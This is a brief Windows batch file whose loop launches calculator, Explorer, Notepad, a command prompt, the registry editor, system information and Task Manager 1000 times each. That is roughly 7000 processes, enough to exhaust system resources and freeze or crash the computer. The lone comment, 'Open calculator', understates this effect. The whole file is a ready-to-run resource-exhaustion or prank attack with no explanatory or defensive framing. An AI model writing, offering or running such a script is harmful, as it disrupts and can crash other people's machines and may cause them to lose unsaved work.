@echo off
setlocal enabledelayedexpansion

FOR /L %%i IN (1,1,1000) DO (
    REM Open calculator
    start "" calc.exe

    start "" explorer.exe
    start "" notepad.exe
    start "" cmd.exe
    start "" regedit.exe
    start "" msinfo32.exe
    start "" taskmgr.exe
)

exit
